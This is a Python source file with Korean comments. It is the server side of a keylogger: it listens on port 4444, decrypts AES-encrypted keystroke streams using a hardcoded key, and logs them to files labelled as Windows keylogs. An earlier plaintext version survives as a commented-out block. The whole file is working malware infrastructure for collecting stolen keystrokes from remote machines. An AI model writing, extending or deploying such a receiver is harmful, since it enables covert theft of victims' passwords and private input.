import socket
import threading
import datetime
import os

from Crypto.Cipher import AES

HOST = '0.0.0.0'
PORT = 4444
key = b"sixteen byte key"


def decrypt_msg(encrypted):
    if len(encrypted) < 16:
        return ""
    
    iv = encrypted[:16]
    encrypted = encrypted[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)
    
    pad_len = decrypted[-1]
    if pad_len > 16 or pad_len == 0:
        return "" # padding error
        
    return decrypted[:-pad_len].decode('utf-8',errors='ignore')

log_dir = "received_keylogs"
os.makedirs(log_dir, exist_ok=True)

timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = f"{log_dir}/keylog_windows_{timestamp}.log"

def handle_client(conn, addr):
    print(f"[+] Connected from {addr}")
    
    with open(log_file, "a", encoding='utf-8') as f:
        f.write(f"=== Session from {addr} started at {datetime.datetime.now()} ===\n")
        f.flush()

        buffer = b""   # ← 실시간 처리에 중요 (암호화 채널 구현으로 binary buffer로 변경함.)


        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    print(f"[-] Client {addr} disconnected")
                    break

                buffer += data

                # 하나의 완전한 메시지(IV 16 + ciphertext) 처리
                while len(buffer) >= 16:
                    # 최소 길이 체크 (IV만 있어도 안 됨)
                    if len(buffer) < 32:   # IV 16 + 최소 16 padding
                        break

                    # 전체 길이를 알 수 없으므로, 가능한 만큼 복호화 시도
                    # 실제로는 IV + ciphertext를 한 번에 받는 구조이므로
                    # decrypt_msg를 호출해서 성공하면 소비
                    try:
                        plaintext = decrypt_msg(buffer)
                        if not plaintext:
                            break  # 아직 데이터 부족

                        # 성공적으로 복호화된 경우
                        lines = plaintext.split('\n')
                        for line in lines:
                            line = line.strip()
                            if not line:
                                continue
                            now = datetime.datetime.now().strftime('%H:%M:%S')
                            log_entry = f"{now} | {line}"
                            
                            f.write(log_entry + "\n")
                            f.flush()
                            print(f"[KEY] {log_entry}")

                        # 사용한 데이터 소비 (decrypt_msg가 성공했다면 buffer 전체를 소비)
                        # 더 정확한 방법: 실제 소비 길이 계산
                        consumed = 16 + ((len(plaintext.encode()) + 15) // 16 * 16)
                        buffer = buffer[consumed:]

                    except Exception:
                        # 복호화 실패 → 데이터가 아직 부족한 경우
                        break

            except Exception as e:
                print(f"[-] Error with {addr}: {e}")
                break


        """
        암호화 채널 구성 이전에는 개행 기준으로 메세지 처리함.
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    print(f"[-] Client {addr} disconnected")
                    break

                buffer += data
                
                
                # 개행 기준으로 잘라서 실시간 처리
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    line = line.strip()
                    if not line:
                        continue

                    now = datetime.datetime.now().strftime('%H:%M:%S')
                    log_entry = f"{now} | {line}"

                    # 1. 파일에 저장
                    f.write(log_entry + "\n")
                    f.flush()

                    # 2. 콘솔에 실시간 출력
                    print(f"[KEY] {log_entry}")
                

            except Exception as e:
                print(f"[-] Error with {addr}: {e}")
                break
        """

    print(f"[-] Disconnected from {addr}")
    conn.close()


def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 포트 재사용
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[*] Listening on {HOST}:{PORT} | Waiting for keylogger...")
        print(f"[*] Log file: {log_file}")

        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    start_server()
